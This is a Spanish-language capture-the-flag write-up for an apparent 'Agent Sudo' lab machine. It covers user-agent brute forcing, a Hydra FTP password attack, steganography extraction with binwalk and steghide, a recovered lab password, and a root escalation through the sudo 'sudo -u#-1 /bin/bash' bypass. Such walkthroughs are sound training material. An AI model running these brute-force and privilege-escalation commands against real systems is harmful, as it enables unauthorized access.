v eb--------------
- Tags:  #writeup #info #vulnhub #tutorial
------------------

### Enumeracion:
Puertos Descubiertos 3.
**HTTP, FTP, SSH**
- Usando burpsuite modificamos el **UserAgent**, bruteforeceamos y vemos en donde cambia la repuesta.
  La letra **C** nos da accesso a la pagina web REAL
  
  El nombre del Agent 1 es **Chris**

Obtenemos las  *Imagenes* del fichero FTP de chris,

- Mediante [[Tools - Software/Hydra]] buscamos la Clave de Chris mediante fuerza bruta:
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.108.160 ftp -I
```


- Usando [[Binwalk]] extrameos la informacion de la imagen y podemos ver el mensaje oculto en el archivo *To_AgentR.txt*
```bash
binwalk cute-alien.jpg 

//Obtener el archivo oculto(extraer)
binwalk cute-alien.jpg -e
```


Contiene Una cadena al parecer en base64, la cual si decodificamos *varias* veces obtenemos la cadea *Area51*

- Con esta cadena ahora usando [[Steghide]] Obtenemos el siguiente mensaje oculto:
```bash
steghide extract -sf cute-alien.jpg
Enter Passphrase: Area51
```

- Esto nos deja extrarer el mensaje que contiene la contraseña del otro usuario (*james*) la cual es:
**hackerrules!**

- Ahora probamos entrar con estas credenciales mediante [[SSH]]:
```bash
ssh james@ipejemplo

//digitamos las credenciales y entramos
```

### Privesc: 
Dentro de la maquina ya tenemos acceso a la Flag1 del usuario NoPrivilegiado:

- Ahora para escalar Privilegios, si ejecutamos un:
```bash
sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

### Expliacacion:
1. User james may run the following commands on agent-sudo:
    
    - `(ALL, !root) /bin/bash`: Esta línea especifica los comandos que el usuario "james" puede ejecutar con "sudo" en la máquina "agent-sudo". En este caso, el comando permitido es "/bin/bash". La parte `(ALL, !root)` indica que el usuario puede ejecutar el comando como cualquier usuario excepto como "root". Esto significa que "james" tiene permiso para ejecutar "/bin/bash" con privilegios elevados, pero no como el usuario superusuario "root".

Falla de implementación de permisos: La falla de implementación en este caso radica en permitir que el usuario "james" ejecute "/bin/bash" con privilegios elevados, aunque no como "root". El problema aquí es que el comando "/bin/bash" es una shell interactiva, lo que significa que "james" puede obtener acceso a una terminal con privilegios elevados y, desde allí, potencialmente realizar acciones no autorizadas o manipular el sistema.

Si se escribe una entrada en sudoers que permita al atacante ejecutar un comando como cualquier usuario excepto root, este fallo puede ser utilizado por el atacante para saltarse esa restricción."

## El usuario no Privilegiado Puede ejecutar el comando:
```bash
sudo -u#-1 /bin/bash
```

- Con eso ya tendria una Bash con Permisos Privilegiados (*Usuario Root*)
- En este punto es cuestion de ir al directorio de *Root* la cual contiene la Ultima Flag





